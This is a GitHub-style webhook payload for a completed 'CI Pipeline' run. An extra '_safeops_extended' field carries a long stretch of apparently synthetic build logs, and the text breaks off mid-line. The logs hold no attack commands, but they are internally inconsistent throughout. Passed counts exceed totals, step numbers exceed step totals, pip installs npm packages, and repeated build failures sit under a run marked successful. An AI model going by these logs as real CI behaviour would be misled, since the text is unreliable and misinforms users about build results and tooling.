{
  "action": "completed",
  "workflow_run": {
    "id": 404,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-141",
    "head_sha": "688ec3363cf3de8335549af3f7f109c781df2832",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:18:45.429015Z",
    "updated_at": "2025-11-25T12:21:58.757041Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nMinifying main.js\nTests: 411 passed, 76 total\nStep 15/20: Testing\nStep 2/17: Building\nnpm notice: package.json updated\nGET /health - 201 (97ms)\nMinifying vendor.js\nUploading artifact 'build' (16 files)\n\u2713 lint completed\nMinifying vendor.js\nEnvironment: development\n[12:18:45] INFO: Request completed\nStep 19/23: Building\nUploading artifact 'coverage' (43 files)\n[12:18:45] INFO: Request completed\nStep 20/16: Linting\nMinifying app.js\npip install: Successfully installed axios-4.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 18/17: Building\nWARNING: axios has known vulnerabilities\nnpm notice: package.json updated\nHEAD is now at 84e3031\nnpm notice: package.json updated\nVerifying...\nWARNING: webpack has known vulnerabilities\n[12:18:45] DEBUG: Memory usage: 1525MB\nLoading...\nConnection established\nCreating production build...\nBundling styles.js\n[12:18:45] DEBUG: Connection pool: 8 active\nReady.\nCache miss for key-3306\n\u2713 Step 'test' succeeded\npip: Downloading lodash-4.10.tar.gz\n[12:18:45] INFO: Starting build process\nTransforming 746 files...\nAlready up to date.\n[12:18:45] INFO: Starting build process\nArtifact downloaded: 50MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed jest-5.12\nInstalling prettier@4.7.7\nImage pulled successfully\nStep 7/17: Installing dependencies\n[12:18:45] INFO: Processing request\n[12:18:45] INFO: Request completed\n[12:18:45] WARN: Deprecated API usage\npip: Downloading react-5.9.tar.gz\nArtifact downloaded: 6MB\nUsing Python 3.9\n\u2713 Task completed in 966ms\nArtifact downloaded: 41MB\nFetching submodules...\nCompleted.\nNODE_ENV=test\n[12:18:45] INFO: Connecting to database\n[12:18:45] DEBUG: Connection pool: 10 active\nTime: 89.925s\npip: Downloading webpack-2.1.tar.gz\nChecking out develop branch\n[12:18:45] WARN: Deprecated API usage\nDone.\n  PASS: test_auth_login (44ms)\n[12:18:45] DEBUG: Connection pool: 17 active\nSwitched to branch 'bugfix/task-610'\nCache miss for key-9100\n[12:18:45] DEBUG: Memory usage: 1908MB\nException: RuntimeError\nReady.\nLoading...\nLayer 7/14: COPY command\n[12:18:45] DEBUG: Connection pool: 20 active\nnpm notice: package.json updated\nPOST /upload - 200 (118ms)\nTest Suites: 10 passed, 33 total\nOK\n[12:18:45] INFO: Request completed\nAlready up to date.\n[12:18:45] DEBUG: Connection pool: 5 active\nyarn add: Done in 28.7s\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'build' succeeded\nStep 20/25: Linting\n[12:18:45] DEBUG: Connection pool: 12 active\n\u2713 All checks passed\n[12:18:45] ERROR: Connection failed\nLayer 10/14: COPY command\nUsing Python 3.10\nGenerating source maps...\nStep 6/25: Linting\nBuilding Docker image...\n[12:18:45] INFO: Request completed\nDone.\npip: Collecting express\nCompiling components/index.js...\nArtifact downloaded: 19MB\nCache saved successfully\nArtifact uploaded: build.tar.gz (19MB)\npip install: Successfully installed express-5.1\nCompiling src/service.java...\npip: Downloading eslint-1.2.tar.gz\nWaiting...\nnpm notice: package.json updated\nCompleted.\n[12:18:45] DEBUG: Query executed in 94ms\nUsing Python 3.12\nWARNING: eslint has known vulnerabilities\nStep 2/20: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\nReady.\n[12:18:45] INFO: Connecting to database\nUsing Python 3.9\nFAILED: test_api_health\nLoading...\nStep 1/17: Linting\n\u2713 Task completed in 1651ms\nPushing to registry...\nnpm install: added 488 packages\nCoverage: 93% statements, 68% branches\nStep 3/21: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: react has known vulnerabilities\n[12:18:45] INFO: Cache refreshed\nArtifact uploaded: dist.zip (28MB)\n[12:18:45] INFO: Connecting to database\n\u2713 Task completed in 628ms\nCompiling lib/index.js...\n[12:18:45] WARN: Deprecated API usage\nStep 18/20: Building\nStep 4/20: Building\n[12:18:45] WARN: Deprecated API usage\nChecking out develop branch\nCompiling utils/main.py...\nBuilding Docker image...\nnpm install: added 117 packages\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (35MB)\nPOST /api - 201 (96ms)\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nDone.\nGenerating source maps...\nPOST /api - 200 (126ms)\nUploading artifact 'build' (31 files)\nImage pulled successfully\nEnvironment: development\nMinifying main.js\nPOST /api - 201 (458ms)\nTime: 14.566s\nCompiling lib/service.java...\n[12:18:45] INFO: Processing request\nInstalling jest@3.15.7\nNODE_ENV=production\nWARNING: axios has known vulnerabilities\nTLS handshake completed\nnpm install: resolved 1740 packages\nConnecting to startup.dev:443...\nException: ValueError\nStep 3/17: Linting\nStep 3/24: Testing\n[12:18:45] INFO: Processing request\nWARNING: express has known vulnerabilities\nPushing to registry...\nWARNING: jest has known vulnerabilities\npip install: Successfully installed webpack-5.16\nCache invalidated: node_modules\nCompiling src/handler.rs...\nPOST /api - 201 (319ms)\nnpm install: resolved 1963 packages\n[12:18:45] INFO: Connecting to database\n\u2713 Task completed in 110ms\nCreating production build...\nArtifact uploaded: build.tar.gz (44MB)\nStep 7/24: Deploying\n[12:18:45] INFO: Connecting to database\n[12:18:45] INFO: Starting build process\nUsing Python 3.11\n[12:18:45] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nCache invalidated: dependencies\npip install: Successfully installed jest-2.5\n\u2713 All checks passed\nPulling image: node:latest\n[12:18:45] DEBUG: Memory usage: 1967MB\nBuilding Docker image...\nArtifact downloaded: 42MB\nVerifying...\nCreating production build...\nCompleted.\npip: Installing build dependencies...\nCompleted.\nnpm notice: package.json updated\n[12:18:45] ERROR: Connection failed\nNODE_ENV=production\nVerifying...\nConnection established\n[12:18:45] INFO: Processing request\nChecking out develop branch\n\u2717 build failed with exit code 117\n[12:18:45] WARN: Deprecated API usage\nChecking out master branch\n[12:18:45] DEBUG: Memory usage: 1674MB\nCache restored successfully (330MB)\nStep 1/22: Running migrations\n\u2713 All checks passed\nFetching submodules...\nStep 20/23: Testing\nChecking out main branch\nCache restored successfully (369MB)\nVerifying...\nBuilding Docker image...\nChecking out main branch\nRan 159 tests in 6s\nPulling image: python:18\n[12:18:45] WARN: Deprecated API usage\nnpm install: resolved 1964 packages\nWARNING: express has known vulnerabilities\nCache saved successfully\nWaiting...\nNODE_ENV=test\n[12:18:45] INFO: Request completed\nCompiling src/main.py...\nGenerating source maps...\nChecking out main branch\npip: Collecting webpack\nPushing to registry...\n[12:18:45] INFO: Connecting to database\nStep 17/18: Testing\nHEAD is now at 21a52e8\npip: Installing build dependencies...\nTransforming 121 files...\nnpm install: resolved 639 packages\nnpm install: resolved 1277 packages\nSwitched to branch 'hotfix/task-714'\n\u2713 Task completed in 2598ms\n[12:18:45] INFO: Processing request\nPulling image: python:18\n[12:18:45] DEBUG: Loading configuration\n\u2713 Task completed in 3511ms\n[12:18:45] INFO: Starting build process\nNODE_ENV=production\nUploading artifact 'coverage' (46 files)\nArtifact uploaded: dist.zip (90MB)\nConnecting to cloud.services:443...\nGET /health - 201 (75ms)\nCache restored successfully (113MB)\n[12:18:45] DEBUG: Loading configuration\nCache invalidated: dependencies\nSwitched to branch 'feature/task-591'\nnpm notice: package.json updated\n  PASS: integration/test_cache_hit.spec.js\nSnapshots: 12 passed, 1 total\nStep 18/19: Building\nWaiting...\n[12:18:45] DEBUG: Loading configuration\nPOST /data - 201 (227ms)\nnpm install: resolved 989 packages\nBundling runtime.js\nUsing Node.js 19.6.2\npip: Downloading webpack-3.20.tar.gz\n  PASS: e2e/test_user_create.spec.js\nChecking out main branch\n  PASS: integration/test_auth_login.spec.js\nCompleted.\nCompiling components/app.ts...\nyarn add: Done in 23.85s\nUsing Python 3.11\nFAILED: test_api_health\nCache hit for key-9221\n[12:18:45] INFO: Request completed\nnpm install: resolved 116 packages\nArtifact uploaded: build.tar.gz (19MB)\nWARNING: lodash has known vulnerabilities\npip install: Successfully installed eslint-2.9\nStep 19/17: Installing dependencies\nPOST /data - 201 (117ms)\nCompleted.\nHEAD is now at d2a2dde\nNODE_ENV=production\nBundling main.css\n[12:18:45] INFO: Connecting to database\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\nArtifact downloaded: 20MB\n[12:18:45] DEBUG: Memory usage: 1394MB\nStep 9/16: Running migrations\nRan 21 tests in 53s\nnpm install: added 391 packages\n  PASS: test_cache_hit (67ms)\nPOST /upload - 201 (426ms)\n  PASS: test_cache_hit (268ms)\nGET /api - 200 (31ms)\npip: Installing build dependencies...\nnpm install: resolved 961 packages\nTransforming 713 files...\n[12:18:45] DEBUG: Connection pool: 18 active\n\u2713 Step 'install' succeeded\nPushing to registry...\nWaiting...\nArtifact downloaded: 7MB\nWaiting...\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 75% statements, 70% branches\nCompiling src/handler.rs...\npip: Collecting eslint\nnpm install: resolved 764 packages\n\u2713 Task completed in 3598ms\nTransforming 581 files...\nUsing Python 3.12\nWARNING: jest has known vulnerabilities\nSnapshots: 11 passed, 16 total\nUsing Python 3.12\nLoading...\n[12:18:45] DEBUG: Query executed in 94ms\nCompiling src/utils.go...\nnpm notice: package.json updated\n\u2713 Task completed in 2447ms\nConnecting to acme.corp:443...\nCompleted.\npip: Installing build dependencies...\nPlatform: linux-x64\nnpm install: resolved 1548 packages\nnpm notice: package.json updated\nVerifying...\n\u2717 build failed with exit code 10\nConnection established\nVerifying...\n\u2713 All checks passed\nnpm install: resolved 1438 packages\nCache miss for key-4568\n  PASS: unit/test_user_create.spec.js\nPlatform: darwin-arm64\n[12:18:45] WARN: Deprecated API usage\npip: Collecting prettier\n\u2713 All checks passed\n[12:18:45] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (59MB)\nPulling image: node:latest\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 23MB\n[12:18:45] INFO: Cache refreshed\n  PASS: unit/test_user_create.spec.js\nPlatform: win32-x64\nInstalling express@3.15.0\nBuilding Docker image...\nGET /health - 204 (69ms)\nCache saved successfully\nInstalling prettier@5.9.8\nPlatform: win32-x64\n  PASS: integration/test_cache_hit.spec.js\nOK\nTests: 333 passed, 489 total\nGenerating source maps...\nFinished.\nBuilding Docker image...\nConnecting to cloud.services:443...\nnpm install: added 121 packages\npip install: Successfully installed webpack-5.2\nConnecting to cloud.services:443...\nLayer 7/15: COPY command\npip: Installing build dependencies...\nGenerating source maps...\n[12:18:45] DEBUG: Loading configuration\nLoading...\n[12:18:45] DEBUG: Query executed in 1ms\n[12:18:45] INFO: Processing request\npip: Installing build dependencies...\n[12:18:45] DEBUG: Initializing service\nAlready up to date.\nChecking out main branch\nWARNING: react has known vulnerabilities\nWaiting...\npip install: Successfully installed express-2.13\nProcessing...\nTransforming 360 files...\nRan 192 tests in 31s\nnpm install: resolved 1059 packages\n  PASS: unit/test_user_create.spec.js\nStep 19/21: Testing\nFetching submodules...\npip install: Successfully installed jest-1.19\nLoading...\nAlready up to date.\nLayer 6/14: ENV command\nOptimizing 54 modules...\nGET /api - 204 (64ms)\nTransforming 809 files...\nLayer 5/8: RUN command\nCache hit for key-7503\nSwitched to branch 'bugfix/task-299'\n\u2713 Task completed in 131ms\nCompiling components/service.java...\nCache restored successfully (358MB)\nUsing Python 3.9\nChecking out develop branch\nLoading...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\nWaiting...\nnpm notice: created a lockfile\nStep 8/17: Installing dependencies\nCreating production build...\nnpm install: added 165 packages\n[12:18:45] DEBUG: Connection pool: 18 active\nCompiling lib/app.ts...\nWARNING: webpack has known vulnerabilities\nBundling runtime.js\nWARNING: react has known vulnerabilities\nNODE_ENV=production\nArtifact downloaded: 44MB\nProcessing...\nWARNING: react has known vulnerabilities\nnpm install: added 368 packages\nChecking out develop branch\nMinifying main.js\nTest Suites: 38 passed, 26 total\nConnection established\nnpm install: resolved 321 packages\nChecking out master branch\nLoading...\n\u2713 validate completed\nCoverage: 90% statements, 67% branches\nTests: 350 passed, 197 total\n=== Step setup_environment completed ===\n=== Step: setup_node ===\nWARNING: eslint has known vulnerabilities\nSnapshots: 38 passed, 16 total\n[12:18:45] DEBUG: Connection pool: 6 active\nBundling vendor.css\nSuccess!\npip install: Successfully installed eslint-3.20\npip: Installing build dependencies...\n[12:18:45] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 19 modules...\nCache restored successfully (435MB)\nStep 20/18: Installing dependencies\nFinished.\nVerifying...\n[12:18:45] DEBUG: Connection pool: 15 active\nCache restored successfully (295MB)\nArtifact uploaded: dist.zip (51MB)\nCompiling src/handler.rs...\nCache invalidated: dependencies\nFAILED: test_cache_hit\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 11/19: Testing\nEnvironment: test\npip: Collecting eslint\nStep 11/25: Linting\nProcessing...\n[12:18:45] INFO: Cache refreshed\nStep 16/17: Building\nnpm notice: package.json updated\n[12:18:45] DEBUG: Loading configuration\n[12:18:45] DEBUG: Loading configuration\nWARNING: prettier has known vulnerabilities\nPushing to registry...\nPOST /upload - 201 (386ms)\n[12:18:45] INFO: Starting build process\nnpm install: resolved 1608 packages\nGET /api - 200 (72ms)\nPushing to registry...\nyarn add: Done in 30.12s\nnpm install: resolved 1918 packages\nLoading...\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 20MB\nFetching submodules...\n\u2713 Step 'setup' succeeded\nOK\nArtifact uploaded: build.tar.gz (16MB)\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] DEBUG: Memory usage: 885MB\nTLS handshake completed\n[12:18:45] INFO: Starting build process\nTLS handshake completed\nGET /status - 201 (67ms)\nStep 2/16: Building\nCompiling src/index.js...\nEnvironment: development\nPushing to registry...\nCache hit for key-4717\nPOST /upload - 200 (221ms)\nUsing Node.js 18.18.1\nConnecting to cloud.services:443...\nCreating production build...\nOK\nCompiling src/index.js...\nStep 18/18: Deploying\nNODE_ENV=development\nEnvironment: production\nTime: 99.425s\nCompiling utils/index.js...\n\u2713 All checks passed\nPushing to registry...\n[12:18:45] INFO: Request completed\nCompiling src/main.py...\nConnecting to cloud.services:443...\nStep 19/25: Deploying\npip: Downloading eslint-2.1.tar.gz\n[12:18:45] DEBUG: Memory usage: 1380MB\nCache saved successfully\n\u2713 Task completed in 920ms\nStep 11/23: Running migrations\nCompiling utils/service.java...\nSuccess!\nStep 5/21: Building\nCompiling lib/main.py...\nRan 62 tests in 22s\nnpm install: resolved 1565 packages\n[12:18:45] WARN: Deprecated API usage\nUsing Node.js 19.8.2\nGET /health - 204 (6ms)\nCreating production build...\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] INFO: Cache refreshed\nnpm notice: created a lockfile\nException: TypeError\nCache miss for key-7125\nPlatform: win32-x64\npip: Installing build dependencies...\nStep 20/23: Installing dependencies\nTLS handshake completed\nEnvironment: staging\npip: Installing build dependencies...\nException: RuntimeError\n\u2713 Step 'build' succeeded\nyarn add: Done in 20.49s\nCompiling components/utils.go...\nCoverage: 94% statements, 99% branches\nHEAD is now at 678549f\nyarn add: Done in 4.48s\nWARNING: jest has known vulnerabilities\nFetching submodules...\n[12:18:45] DEBUG: Query executed in 93ms\nCompleted.\npip: Downloading react-4.4.tar.gz\nCache miss for key-6617\nFetching submodules...\nPushing to registry...\nArtifact uploaded: dist.zip (99MB)\n[12:18:45] DEBUG: Initializing service\n[12:18:45] INFO: Connecting to database\nOptimizing 62 modules...\nConnecting to example.com:443...\nGenerating source maps...\n\u2713 package completed\n\u2717 build failed with exit code 38\nPlatform: win32-x64\nCache restored successfully (97MB)\nArtifact downloaded: 43MB\nStep 5/18: Linting\nnpm notice: created a lockfile\nTransforming 617 files...\nFinished.\nUsing Node.js 16.16.7\nBuilding Docker image...\npip install: Successfully installed react-1.3\n  PASS: test_cache_hit (248ms)\nTransforming 315 files...\n[12:18:45] DEBUG: Memory usage: 537MB\nBuilding Docker image...\n[12:18:45] INFO: Connecting to database\n\u2713 All checks passed\nStep 3/18: Testing\n=== Step setup_node completed ===\n=== Step: save_cache ===\nyarn add: Done in 16.18s\nConnection established\nSuccess!\nOptimizing 55 modules...\n[12:18:45] ERROR: Connection failed\n[12:18:45] ERROR: Connection failed\nMinifying vendor.js\nyarn add: Done in 20.66s\nConnection established\nStep 11/20: Running migrations\nOK\n  PASS: unit/test_db_connect.spec.js\nPushing to registry...\nPlatform: linux-x64\npip install: Successfully installed eslint-3.2\nnpm notice: package.json updated\nCompiling utils/handler.rs...\nWaiting...\nArtifact uploaded: dist.zip (52MB)\nArtifact downloaded: 8MB\nSwitched to branch 'bugfix/task-270'\nnpm install: added 439 packages\nCreating production build...\nCache saved successfully\nCompiling lib/app.ts...\n[12:18:45] DEBUG: Query executed in 95ms\n\u2717 build failed with exit code 7\nWARNING: jest has known vulnerabilities\n  PASS: unit/test_db_connect.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\nnpm notice: package.json updated\nCache restored successfully (178MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-7706\nReady.\n[12:18:45] INFO: Connecting to database\n\u2713 Task completed in 294ms\n[12:18:45] DEBUG: Connection pool: 1 active\nCompiling components/utils.go...\n\u2713 lint completed\nDone.\n\u2713 Task completed in 4786ms\nUsing Python 3.12\n[12:18:45] INFO: Starting build process\nGenerating source maps...\nBundling main.js\n  PASS: unit/test_cache_hit.spec.js\nLoading...\nnpm notice: package.json updated\nReady.\nFAILED: test_auth_login\nnpm install: resolved 465 packages\nVerifying...\n[12:18:45] DEBUG: Connection pool: 12 active\nCache miss for key-2794\nCompleted.\nCompiling utils/index.js...\nArtifact uploaded: dist.zip (34MB)\nCompleted.\n\u2713 build completed\nSwitched to branch 'hotfix/task-968'\nUsing Node.js 14.11.3\nCache hit for key-4962\nUsing Node.js 19.1.4\nStep 19/24: Installing dependencies\nnpm notice: created a lockfile\npip install: Successfully installed webpack-2.4\nPOST /upload - 201 (255ms)\nDone.\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 35.814s\nCache miss for key-6134\npip: Downloading prettier-3.0.tar.gz\nCompiling components/handler.rs...\n[12:18:45] DEBUG: Connection pool: 8 active\n[12:18:45] INFO: Connecting to database\nHEAD is now at adf464d\nCompiling lib/service.java...\nVerifying...\nCoverage: 71% statements, 82% branches\nCache miss for key-8463\nTest Suites: 16 passed, 15 total\nFAILED: test_db_connect\nAlready up to date.\nVerifying...\n\u2713 Task completed in 1594ms\n[12:18:45] INFO: Starting build process\nFetching submodules...\n  PASS: unit/test_user_create.spec.js\n\u2713 build completed\nDone.\n[12:18:45] DEBUG: Connection pool: 11 active\nnpm install: added 390 packages\nStep 16/25: Installing dependencies\n[12:18:45] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (48MB)\nFetching submodules...\nnpm notice: package.json updated\n\u2713 All checks passed\n\u2713 Task completed in 2967ms\n[12:18:45] DEBUG: Initializing service\n[12:18:45] INFO: Starting build process\n[12:18:45] DEBUG: Connection pool: 8 active\nConnection established\nArtifact uploaded: build.tar.gz (28MB)\nStep 7/24: Linting\nBundling styles.js\nUploading artifact 'coverage' (17 files)\n[12:18:45] INFO: Cache refreshed\nPlatform: win32-x64\nFinished.\nUsing Node.js 20.9.4\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 133 packages\nOptimizing 37 modules...\nnpm notice: package.json updated\n[12:18:45] INFO: Starting build process\nCache miss for key-3165\npip install: Successfully installed jest-2.12\n[12:18:45] INFO: Starting build process\nLayer 6/14: RUN command\nDone.\nRan 12 tests in 3s\nChecking out develop branch\nBuilding Docker image...\nException: TypeError\n\u2713 Step 'build' succeeded\nArtifact uploaded: build.tar.gz (50MB)\n[12:18:45] INFO: Processing request\nPushing to registry...\n[12:18:45] WARN: Deprecated API usage\nWaiting...\nVerifying...\nArtifact downloaded: 15MB\nInstalling express@5.5.5\n\u2713 Task completed in 847ms\nVerifying...\nCreating production build...\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nUploading artifact 'dist' (33 files)\n[12:18:45] DEBUG: Query executed in 86ms\nPlatform: darwin-arm64\nTransforming 697 files...\nStep 3/24: Deploying\n\u2713 package completed\nProcessing...\nInstalling eslint@2.3.4\nSuccess!\nFinished.\nEnvironment: test\nHEAD is now at 265c1c0\n[12:18:45] WARN: Deprecated API usage\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 4/15: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: RuntimeError\nFetching submodules...\n[12:18:45] DEBUG: Query executed in 3ms\nFinished.\nTests: 72 passed, 220 total\n\u2713 test completed\nCompiling components/app.ts...\n[12:18:45] ERROR: Connection failed\nUsing Node.js 17.6.4\nUsing Python 3.12\nWaiting...\nCache restored successfully (171MB)\nUsing Node.js 18.10.5\nnpm install: added 498 packages\nSwitched to branch 'bugfix/task-765'\n[12:18:45] INFO: Starting build process\nWARNING: express has known vulnerabilities\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 16.6.3\nTransforming 161 files...\nRan 138 tests in 11s\nBundling main.js\n[12:18:45] DEBUG: Query executed in 16ms\nInstalling jest@4.6.5\n[12:18:45] INFO: Connecting to database\n\u2713 Task completed in 896ms\nTLS handshake completed\npip: Collecting prettier\nCompiling lib/app.ts...\n[12:18:45] INFO: Processing request\nArtifact downloaded: 31MB\nCompleted.\nPlatform: darwin-arm64\nFinished.\nNODE_ENV=development\nHEAD is now at c131102\nUsing Python 3.11\nLayer 9/10: RUN command\nHEAD is now at 6d751e2\nLoading...\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_cache_hit (423ms)\nCreating production build...\nGET /status - 201 (54ms)\nCompiling components/app.ts...\nVerifying...\npip: Downloading webpack-1.15.tar.gz\n\u2713 Step 'test' succeeded\nStep 18/15: Running migrations\nAlready up to date.\nConnecting to cloud.services:443...\nStep 7/15: Linting\nPlatform: win32-x64\nCache restored successfully (343MB)\nGenerating source maps...\nStep 7/15: Deploying\nConnecting to test.io:443...\nStep 2/21: Running migrations\nGenerating source maps...\nException: ValueError\nImage pulled successfully\nPOST /data - 200 (478ms)\nHEAD is now at 05cac47\nVerifying...\n\u2713 test completed\nCompiling src/utils.go...\nVerifying...\n[12:18:45] DEBUG: Query executed in 8ms\nAlready up to date.\nGenerating source maps...\nChecking out master branch\nFetching submodules...\nStep 4/23: Installing dependencies\nWaiting...\nStep 1/24: Linting\n\u2713 All checks passed\npip: Collecting axios\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/22: Testing\nStep 8/17: Linting\nCompiling lib/service.java...\nFinished.\nGenerating source maps...\nWaiting...\nUsing Python 3.11\nFetching submodules...\nOK\npip: Downloading prettier-5.6.tar.gz\nPushing to registry...\nOK\nTime: 19.508s\nGenerating source maps...\nLayer 2/14: ENV command\n[12:18:45] INFO: Starting build process\nPushing to registry...\nUsing Node.js 16.9.7\nPulling image: node:3.11\n[12:18:45] DEBUG: Connection pool: 1 active\n[12:18:45] DEBUG: Connection pool: 3 active\nCreating production build...\nCompiling lib/main.py...\nnpm notice: created a lockfile\nImage pulled successfully\nPOST /data - 201 (90ms)\nException: ValueError\nSwitched to branch 'bugfix/task-790'\nWaiting...\nStep 15/15: Deploying\nDone.\n[12:18:45] INFO: Connecting to database\nOK\n  PASS: integration/test_user_create.spec.js\n  PASS: unit/test_user_create.spec.js\n  PASS: e2e/test_auth_login.spec.js\nFinished.\nPlatform: win32-x64\nEnvironment: staging\nBuilding Docker image...\nHEAD is now at 1458b94\nTransforming 420 files...\n\u2713 Task completed in 1604ms\nTLS handshake completed\nCache saved successfully\nArtifact uploaded: dist.zip (22MB)\n=== Step deploy_production completed ===\n=== Step: checkout ===\nPushing to registry...\nWARNING: express has known vulnerabilities\nLoading...\nCache hit for key-9700\n\u2713 Step 'checkout' succeeded\nLayer 10/11: ENV command\nWARNING: prettier has known vulnerabilities\nConnecting to example.com:443...\n  PASS: integration/test_user_create.spec.js\n  PASS: unit/test_cache_hit.spec.js\nCache saved successfully\nArtifact downloaded: 8MB\n[12:18:45] WARN: Deprecated API usage\nNODE_ENV=test\nCompiling components/index.js...\nStep 14/21: Building\n  PASS: e2e/test_api_health.spec.js\nUsing Python 3.9\nWaiting...\nHEAD is now at d84c323\nCache restored successfully (494MB)\nTime: 8.86s\nProcessing...\n[12:18:45] WARN: Deprecated API usage\nReady.\nCompiling src/utils.go...\nCache invalidated: build\n  PASS: test_db_connect (230ms)\n[12:18:45] INFO: Connecting to database\nArtifact uploaded: dist.zip (84MB)\nGET /health - 204 (95ms)\nSnapshots: 22 passed, 30 total\nPushing to registry...\n[12:18:45] INFO: Connecting to database\nStep 6/16: Building\nSuccess!\nStep 4/22: Running migrations\npip install: Successfully installed prettier-2.1\nCreating production build...\n[12:18:45] WARN: Deprecated API usage\n  PASS: integration/test_db_connect.spec.js\nCache saved successfully\nStep 11/18: Linting\nImage pulled successfully\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] WARN: Deprecated API usage\nCreating production build...\nConnection established\n[12:18:45] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 137 tests in 49s\nImage pulled successfully\nLoading...\n[12:18:45] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-1941\nCache restored successfully (484MB)\nStep 5/23: Building\nFetching submodules...\nConnecting to cloud.services:443...\nCompiling lib/utils.go...\nCreating production build...\npip: Installing build dependencies...\nPushing to registry...\n[12:18:45] INFO: Connecting to database\nPushing to registry...\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTime: 88.808s\nStep 3/15: Linting\nException: NullPointerException\nImage pulled successfully\n[12:18:45] INFO: Starting build process\nBuilding Docker image...\nPOST /api - 202 (98ms)\nBuilding Docker image...\nSnapshots: 5 passed, 36 total\nnpm install: resolved 1154 packages\nUsing Python 3.10\n[12:18:45] INFO: Connecting to database\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (24MB)\nVerifying...\nCache restored successfully (227MB)\nOK\nCompiling src/service.java...\nAlready up to date.\nyarn add: Done in 10.6s\nConnection established\n  PASS: test_cache_hit (147ms)\nTime: 104.184s\nStep 15/15: Installing dependencies\nConnecting to example.com:443...\nGenerating source maps...\n[12:18:45] INFO: Cache refreshed\nOptimizing 80 modules...\nDone.\nChecking out develop branch\n[12:18:45] INFO: Starting build process\nChecking out main branch\nCoverage: 88% statements, 61% branches\n[12:18:45] DEBUG: Loading configuration\nVerifying...\nConnecting to cloud.services:443...\nnpm install: added 334 packages\n\u2713 validate completed\nInstalling react@2.2.6\n[12:18:45] DEBUG: Connection pool: 5 active\n[12:18:45] INFO: Cache refreshed\n\u2713 Task completed in 1572ms\npip: Downloading jest-1.2.tar.gz\nCompiling components/handler.rs...\n[12:18:45] DEBUG: Memory usage: 1413MB\nConnection established\n\u2713 Task completed in 2995ms\n[12:18:45] INFO: Processing request\n\u2713 All checks passed\nProcessing...\n[12:18:45] WARN: Deprecated API usage\nDone.\n[12:18:45] DEBUG: Memory usage: 745MB\n\u2717 build failed with exit code 63\nChecking out master branch\nPlatform: linux-x64\nAlready up to date.\nPlatform: linux-x64\nTests: 80 passed, 329 total\n  PASS: unit/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying vendor.js\n[12:18:45] INFO: Cache refreshed\nConnecting to acme.corp:443...\nPushing to registry...\nException: ValueError\nEnvironment: staging\n[12:18:45] INFO: Cache refreshed\n[12:18:45] ERROR: Connection failed\nUsing Python 3.12\nUsing Python 3.11\n=== Step checkout completed ===\n=== Step: type_check ===\npip: Downloading webpack-5.5.tar.gz\nArtifact uploaded: dist.zip (58MB)\nWARNING: eslint has known vulnerabilities\nChecking out develop branch\nOK\nCache invalidated: dependencies\nInstalling express@4.8.3\n[12:18:45] WARN: Deprecated API usage\nNODE_ENV=development\nOK\n\u2713 Step 'build' succeeded\nInstalling jest@1.13.0\nInstalling axios@5.17.6\npip: Collecting prettier\nCreating production build...\nWARNING: jest has known vulnerabilities\n[12:18:45] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nBundling runtime.css\nAlready up to date.\n  PASS: test_api_health (318ms)\nCache miss for key-3630\nBundling runtime.js\nArtifact uploaded: build.tar.gz (18MB)\nSuccess!\n[12:18:45] DEBUG: Query executed in 12ms\nCreating production build...\nLoading...\nPOST /api - 200 (395ms)\nReady.\nArtifact uploaded: build.tar.gz (47MB)\nGET /api - 204 (37ms)\nUsing Python 3.10\nLayer 7/8: RUN command\n\u2717 build failed with exit code 39\nGET /api - 200 (93ms)\nNODE_ENV=development\nOK\nFinished.\nCache hit for key-7676\n[12:18:45] WARN: Deprecated API usage\nBuilding Docker image...\nStep 5/24: Testing\nAlready up to date.\npip: Installing build dependencies...\nSuccess!\nCache invalidated: dependencies\n\u2713 